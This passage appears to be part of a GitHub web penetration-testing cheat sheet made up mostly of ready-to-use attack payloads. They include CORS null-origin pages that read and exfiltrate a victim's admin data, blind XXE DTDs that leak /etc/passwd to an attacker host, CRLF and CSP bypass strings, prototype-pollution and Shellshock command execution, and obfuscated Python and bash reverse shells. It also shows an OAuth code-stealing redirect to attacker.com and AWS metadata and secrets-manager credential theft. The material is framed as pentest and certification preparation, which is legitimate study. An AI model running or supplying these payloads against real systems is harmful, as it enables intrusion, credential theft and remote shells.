https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py

### Tool's
-> Gopherus  
https://github.com/tarunkant/Gopherus
  
#### Docs for SSRF
https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf  
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

## Insecure RMI
-> Scan on default ports with nmap  
```
nmap -p 1090,1098,1099,1199,4443-4446,8999-9010,9999 -sV
```
-> remote-method-guesser  
```
rmg enum 172.17.0.2 9010
```
https://github.com/qtc-de/remote-method-guesser

-> JMX Exploitation  
E.g.   
//Open port Java RMI 9991  
`jython sjet.py <target_host> 9991 password install http://<ip>:8000 8000`  
`jython sjet.py <target_host> 9991 password command "ls -la"`  
https://github.com/siberas/sjet  
http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar  

-> bARMIe  
https://github.com/NickstaDB/BaRMIe

## Null Origin Exploitation
-> Identify - Response
```
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true
```

### Common
-> nullorigin.html  
```
<html><head>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
	var r = xhr.responseText;
	alert(r)
	}
}
xhr.open('GET', 'http://site.com/admin.php', true);
xhr.withCredentials = true;
xhr.send(null);
</script>
</head></html>

``` 

### Null Origin Exploitation Exfiltrate via url per server
-> nullorigin2.html
```
<html><head>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
 		var r = xhr.responseText;
		var d = r.split('>')[1].split('<')[0]
		function exfil() {
			document.write('<img src="http://your-ip:your-port/log.php?data=' + d + '"/>');
	}
	exfil();
	}
}
xhr.open('GET', 'http://site.com/admin.php', true);
xhr.withCredentials = true;
xhr.send(null);
</script>
</head></html>
```  

### Null Origin Exploitation Exfiltrate via url per server + base64
-> nulloriginb64.html
```
<iframe src="data:text/html;base64,<YOUR_BASE64_HERE>"></iframe>
</head></html>
```

## CRLF Injection

e.g.  
-> Redirect via GET  
```
/%0d%0aLocation:attacker
```  
-> XSS via GET  
```
/%0d%0a%0d%0a<svg onload="alert(1)">
```

### XSS-Protection Bypass via CRLF
```
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```

### CSP Bypass via CRLF
```
%0d%0aX-Content-Security-Policy: allow *%0d%0a%0d%0a
%0d%0aX-Content-Security-Policy: allow *
```

### Tools
```
crlfuzz -u "http://example.com"
```
https://github.com/dwisiswant0/crlfuzz

### Template - Nuclei
https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/crlf-injection.yaml

## Elasticsearch - API
-> Extract info  
```
http://<ip:>9200/_cat/indices?v  
http://<ip>:9200/<indice>  
http://<ip>:9200/_search?pretty=true&q=pass  
```

## XML External Entity - XXE
### Methods:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

## XXE - Blind Out-Of-Band
### Exfiltrate data exfiltrating data via dtd
-> Part 1 (Main Request)
```
<!DOCTYPE r[
<!ELEMENT r ANY>
<!ENTITY % ult SYSTEM "http://ip/evil.dtd">
%ult;
%int;
]>
<r>&exfil;</r>
```
  
-> Part 2 (evil.dtd)
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">  
<!ENTITY % int "<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">  
```  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd

### Retrieve data via error messages with dtd file
-> Part 1 (Request Principal)
```
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://ip/error.dtd"> 
%xxe;
%payload;
%remote;
]>
```
-> Part 2 (error.dtd)

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd  

```
  
### XInclude to retrieve files with dtd file
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### Image file upload

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg

## XSLT Server Side Injection
### Identify  
-> Transformation Service  
-> XSLT engine  

### Exploit 
-> ok.xsl
```
<!--
- Simple test to call php function
-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
 <xsl:template match="/">
 <html>
 <!-- We use the php suffix to call the function ucwords() -->
 <xsl:value-of select="php:function('system','uname -a')" />
 <!-- Output: 'Php Can Now Be Used In Xsl' -->
 </html>
 </xsl:template>
</xsl:stylesheet>
```

## Prototype Pollution

### Client Side
https://github.com/BlackFan/client-side-prototype-pollution
  
### Server Side
-> exec.exec in req body with lodash - application/json
  
```
"__proto__":{
  "shell":"sleep 5"
}
```  
https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
  
-> exec.fork in req body with lodash - application/json  

```
  "__proto__":{
    "execPath":"/bin/bash",
    "execArgv":[
    "-c",
    "sleep 5"  
    ]
  }
```  
https://nodejs.org/api/process.html

## Remote Code Execution

### RCE - Exfiltrating via DNS
```
curl http://$(whoami).site.com/
curl http://`whoami`.site.com/
```

### Wordlists
https://github.com/payloadbox/command-injection-payload-list

## API Exploitation
-> API Security Guide  
https://github.com/0xCGonzalo/Golden-Guide-for-Pentesting/tree/master/API%20Security

-> API Security Checklist  
https://github.com/shieldfy/API-Security-Checklist

-> API Security Tips  
https://github.com/inonshk/31-days-of-API-Security-Tips

-> MindAPI  
https://dsopas.github.io/MindAPI/play/  

-> Simple website to guess API Key  
https://api-guesser.netlify.app/

-> HackTricks  
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting

-> Fuzzing  
https://github.com/assetnote/kiterunner

### Rest API/JSON
The standard documentation is the WADL file:  
e.g.  
https://site.com/api/v1/wadl/  
or  
representation engines  
-> swagger-ui  
https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter
	
### SOAP/XML
The documentation uses WSDL formate and is save in ?wsdl:  
e.g.  
https://api.example.com/api/?wsdl  
https://site.com/ok.asmx?wsdl  

-> API testing tool  
https://www.soapui.org/downloads/soapui
	
### Graphql
-> Introspection  
https://ivangoncharov.github.io/graphql-voyager/  
	
-> No-Introspection - Clairvoyance allows us to get GraphQL API schema when introspection is disabled  
https://github.com/nikitastupin/clairvoyance  
	
-> graphw00f - GraphQL Server Fingerprinting  
```
python3 main.py -f -t https://demo.hypergraphql.org:8484/graphql
```
https://github.com/dolevf/graphw00f  
	
-> GraphQL Security - Quickly assess the security of your GraphQL apps  
https://graphql.security/

## JSON Web Tokens - JWT Attacks
-> Structure with jwt.io - decoder  
https://jwt.io/  
	
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
	
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (Header)`  
`eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ (Payload)`  
`SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c (Signature)`  
	
### JWT None Attack
1. Change signature algorithm in the header to none  
`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`  
2. Forge the payload content  
3. Leave the Signature part of the JWT empty and put a period in the token  
	
### JWT Decoder
-> jwt-decoder.py  
```
python3 jwt-decoder.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
```
https://github.com/mazen160/jwt-pwn  

### JWT Cracking - Brute-Force
-> go-jwt-cracker  
```
./go-jwt-cracker -wordlist /pentest/wordlist.txt -token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
```
https://github.com/mazen160/jwt-pwn

-> Hashcat  
```
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
hashcat jwt.txt -m 16500 -a 3 -w 2 ?d?d?d?d
```
-> John  
```
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

### Other Tools
-> jwt_tool.py   
```
python3 jwt_tool.py <JWT>
```
https://github.com/ticarpi/jwt_tool

#### Docs
https://rodolfomarianocy.medium.com/jwt-token-entenda-do-ponto-de-vista-defensivo-e-ofensivo-1aad6406de53
	
## Attacking OAuth
### Workflow OAuth Authorization Code Grant Type
1- 
  
```
GET /authorization?client_id=<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1  
Host: site.com
```
2-
  
```
GET /callback?code=<code> HTTP/1.1
Host: site.com
```
Vulnerability Forced OAuth profile linking
  
-> CSRF
```
<html>
	<body>
      		<form action="http://site.com/callback?code=<code>" method="GET">
		</form> 
	</body>
	<script>
		document.forms[0].submit();
	</script>
</html>
```  

Vulnerability Code Stealing

-> Open Redirect (redirect_uri)
```
https://site.com/authorization?client_id=%3Cclient_id%3E&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
```
3-
```
POST /token HTTP/1.1
Host: oauth.server.com

client_id=<client_id>&client_secret=<client_secret>&redirect_uri=https://site.com/callback&grant_type=authorization_code&code=<code>
```
Vulnerability Brute-Force the Client Secret

```
POST /token 
Host: site.com
Content-Type: application/x-www-form-urlencoded  

client_id=<client_id>&client_secret=<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
```  
4-
```  
{
    "access_token": "<access_token>",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile"
}
```

5-
```  
GET /userinfo HTTP/1.1  
Host: oauth.server.com  
Authorization: Bearer <token>
```

6- 
```
{
    "username":"user",
    "email":"user@ok.com"
}
```

## Padding Oracle Attack
  
e.g.  
-> rememberMe: (Cookie)  
-> Exploiting  
```
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class
```  
https://github.com/frohoff/ysoserial  
```
python shiro_exp.py site.com/home.jsp cookie payload.class
```  
https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py  
	
### Reverse Shell Obfuscator
e.g.  
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```  
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  

```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```  
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type urle`  
```
py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
```
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64`  
```
cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
```
`
python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
`
```
bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
```
https://github.com/rodolfomarianocy/hackshell  

-> Other Tricks - Bypass  
```
"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
```
### Shellshock
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com
```
### ImageTragik
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg

## Third-party Software, ITSM, ITSO, ITBM
### Jira
-> Check privileges in:  
```
/rest/api/2/mypermissions
/rest/api/3/mypermissions
```
-> jira-scan  
```
jira-scan -u https://site.com/
```
https://github.com/bcoles/jira_scan

-> Jiraffe
```
jiraffe -t https://site.com
```
https://github.com/0x48piraj/Jiraffe

### SalesForce
-> sret  
```
python3 main.py <URL>
```
https://github.com/reconstation/sret

### SAP - ERP
#### Tools
https://github.com/chipik/SAP_RECON

#### Wordlists
https://raw.githubusercontent.com/emadshanab/SAP-wordlist/main/SAP-wordlist.txt

#### Others
https://github.com/shipcod3/mySapAdventures

### ServiceNow
-> Brute-Force in KB00<here>  
```
https://company.service-now.com/kb_view_customer.do?sysparm_article=KB00xxxxx
```
https://medium.com/@th3g3nt3l/multiple-information-exposed-due-to-misconfigured-service-now-itsm-instances-de7a303ebd56

### Sharepoint
https://github.com/H0j3n/EzpzSharepoint

## CMS
### Wordpress
-> wpscan  
```
wpscan --url http://site.com/wordpress --api-token <your_token> --enumerate vp --plugins-detection aggressive
```  
https://wpscan.com/wordpress-security-scanner

### Joomla
-> juumla  
```
python main.py -u <target>
```  
https://github.com/oppsec/juumla  

### Drupal
-> droopescan  
```
droopescan scan drupal -u <target> -t 32
```
https://github.com/SamJoan/droopescan  

-> Reverse Shell  
https://www.hackingarticles.in/drupal-reverseshell/

### Magento
https://github.com/steverobbins/magescan 

## Fuzzing (+) 
### Fuzzing Subdomain - DNS
```
ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### Fuzzing Subdomain - VHOST
```
ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx
```

### Fuzzing File Extension
```
ffuf -u "https://site.com/indexFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx
```

### Fuzzing Parameter GET
```
ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx
```
  
### Fuzzing Parameter POST
```
ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx
```  
https://github.com/danielmiessler/SecLists

## Cloud (+)
### Tricks in AWS 
-> Serverless Injection  
`echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`

-> Meta-data  
```
curl http://169.254.169.254/latest/api/token 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```   

-> Models s3  
`http://<BUCKETNAME>.s3.amazonaws.com/`  
or  
`http://s3.amazonaws.com/<BUCKETNAME>/`  
-> Recon  
```
export AWS_ACCESS_KEY_ID=<access_key_id>   
export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
export AWS_SESSION_TOKEN=<session_token>  

aws sts get-caller-identity  
aws iam get-user  
aws sts get-session-token
aws s3 ls s3://<bucket> --no-sign-request  
aws ec2 describe-instances
```
```
aws configure --profile myprofile  
aws sts get-access-key-info --access-key-id AKIA...    
aws sts get-caller-identity --profile myprofile  
aws ec2 describe-instances  --profile myprofile

```
```
aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
```
-> EKS  
```
aws eks list-clusters --region us-east-1  
aws eks describe-cluster --name <name_cluster> --region us-east-1  
aws eks update-kubeconfig --region us-east-1 --name <name_cluster>  
./kubectl get pods  
./kubectl describe pods <name_pods>  
./kubectl get pods --all-namespace
```

### Tools

https://github.com/clarketm/s3recon  
https://github.com/RhinoSecurityLabs/pacu
  
## Recon (+)
### Recon in ASN  
-> asnpepper  
```
python asnpepper.py -o <org> -O output.txt
```  
-> masscan  
```
masscan -iL cidrs.txt -oG output.txt — rate 10000 -p 80, 443, 8080
```  
or  
```
python asnpepper.py -o <org> --test-port 80,443 --threads 2000
```  
https://bgp.he.net/  
https://github.com/rodolfomarianocy/asnpepper  
https://github.com/robertdavidgraham/masscan  

### One Line Commands
-> Parameters Discovery  
```
python paramspider.py -d stripe.com | uro | httpx -fc 404 -silent | anew spider_parameters.txt && echo stripe.com | gau | gf xss | uro |  httpx -fc 404 -silent | anew gau_parameters.txt
```

### Steps - Web Recon
#### 1 - Subdomain Discovery
1.1 -> sublist3r+sort|uniq+httpx+anew  
```
subslit3r -d site.com | sort | uniq | httpx -silent | anew subdomains.txt
```

1.2 -> subfinder+sort|uniq+httpx+anew  
```
subfinder -d site.com  | sort | uniq | httpx -silent | anew subdomains.txt
```

1.3 -> crt+jq+grep+httpx+anew  
```
curl "https://crt.sh/?q=$1&output=json" | jq -r '.[].name_value' | grep -v "*" | httpx -silent | anew subdomains.txt
```

#### 2 - Parameter Discovery
2.1 -> gau+gf+uro+httpx+anew  
```
cat subdomains.txt | gau | gf xss | uro | httpx -silent | anew parameters.txt
```

2.2 -> paramspider + uro + httpx  
```
cat subdomains.txt | xargs -n 1 python paramspider.py -d | httpx -silent | gf xss | uro | anew parameters.txt
```  

#### 3 - JS files
3.1 -> gau+grep+httpx  
```
cat subdomains.txt | grep "\.js" | httpx -fc 404 -silent -o js_files.txt
```  
or  
```
cat subdomains.txt | gau | subjs
```

#### 4 - Discover endpoints and their parameters in JS files
```
python linkfinder.py -i https://example.com/1.js -o results.html
```

-> Used Tools  
https://github.com/projectdiscovery/subfinder  
https://github.com/aboul3la/Sublist3r  
https://github.com/devanshbatham/ParamSpider  
https://github.com/s0md3v/uro  
https://github.com/projectdiscovery/httpx  
https://github.com/tomnomnom/gf  
https://github.com/1ndianl33t/Gf-Patterns  
https://github.com/stedolan/jq  
https://github.com/lc/subjs  
https://github.com/GerbenJavado/LinkFinder  

#### Other Tools
-> Project Discovery (Subdomain Discovery)  
https://chaos.projectdiscovery.io/#/  
-> aquatone (Tool for visual inspection of websites)  
https://github.com/michenriksen/aquatone  

## Certifications
### elearn Web Application Penetration Tester eXtreme - eWPTX
Apresentation def con Caxias do Sul - DCG5554  
https://www.youtube.com/watch?v=2-im6aL6PkI 
![1](https://user-images.githubusercontent.com/54555784/199234358-f3652fa2-14fa-4fc6-9e25-948c4bbace72.png)
![2](https://user-images.githubusercontent.com/54555784/199234516-227a055a-7413-413d-b6f6-07384a4672de.png)
![3](https://user-images.githubusercontent.com/54555784/199234532-331177d0-f9da-45a1-a156-d52e1560f8e7.png)
![4](https://user-images.githubusercontent.com/54555784/199234542-01623a13-7b90-4b80-b6b6-07705ec2cd94.png)
![5](https://user-images.githubusercontent.com/54555784/199234564-929ff2ae-2410-4605-8fa7-64fa0cab4195.png)
![6](https://user-images.githubusercontent.com/54555784/199234571-78ebf007-2365-4eeb-b3d1-8c5776ea8b3c.png)
![7](https://user-images.githubusercontent.com/54555784/199234642-442174e0-f4c8-4033-a179-595da70da270.png)
![8](https://user-images.githubusercontent.com/54555784/199234650-a9bd4b40-f1b2-4436-ae8d-cb76ab9d9c0b.png)
![9](https://user-images.githubusercontent.com/54555784/199234657-28fe263a-1d81-4b90-9f23-75ad8394f456.png)
![10](https://user-images.githubusercontent.com/54555784/199234663-db848e0c-f6cd-4df0-a004-8caffc6e32b6.png)
![11](https://user-images.githubusercontent.com/54555784/199234674-5f294bb0-46ff-428b-aa85-d819c80b6d2b.png)
![12](https://user-images.githubusercontent.com/54555784/199234677-dce5513b-ebdf-46f0-8167-9134f28c2e64.png)
![13](https://user-images.githubusercontent.com/54555784/199234729-5055681c-8841-4f41-b072-dea537f9ba16.png)

References:  
https://elearnsecurity.com/product/ewptxv2-certification/  
https://ine.com/learning/courses/web-application-penetration-testing-e-xtreme  
https://rodolfomarianocy.medium.com/overview-ewptx-5a9d78414c7a  
https://crowsec.com.br/  
https://portswigger.net/web-security/all-labs  

## Other tools and things
#### Search across a half million git repos
https://grep.app
  
#### The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
https://gchq.github.io/CyberChef/
  
#### List of file signatures
https://en.wikipedia.org/wiki/List_of_file_signatures

#### Regex 
https://regex101.com/

#### Encode for SQL Injection in Json
https://dencode.com/string/unicode-escape
  
#### Wildcard DNS
https://nip.io/
  
#### Explain Shell
https://explainshell.com/

#### CeWL - Custom Word List generator
https://github.com/digininja/CeWL

#### Webhook online
https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0

#### builtwith - Find out what websites are Built with
https://builtwith.com/

#### Reverse Shell
https://www.revshells.com/
 
#### Api Security
https://platform.42crunch.com/

#### Source Code Search Engine
https://publicwww.com/
